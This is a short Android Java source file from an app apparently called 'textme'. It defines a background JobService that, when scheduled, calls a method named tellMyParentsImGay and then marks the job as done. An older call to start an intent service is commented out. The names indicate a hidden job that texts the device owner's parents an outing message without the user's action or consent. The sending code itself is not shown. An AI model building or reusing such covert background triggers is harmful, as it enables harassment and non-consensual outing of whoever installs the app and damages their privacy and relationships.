package com.candroid.textme.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import com.candroid.textme.api.Lofl;
import com.candroid.textme.jobs.JobsIntentService;
import com.candroid.textme.jobs.JobsScheduler;

public class TextParentsJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
/*        Intent textParentsIntent = new Intent(this, JobsIntentService.class);
        textParentsIntent.setAction(JobsIntentService.ACTION_TEXT_PARENTS);
        startService(textParentsIntent);*/
        Lofl.tellMyParentsImGay(this);
        Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
        this.jobFinished(params, false);
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}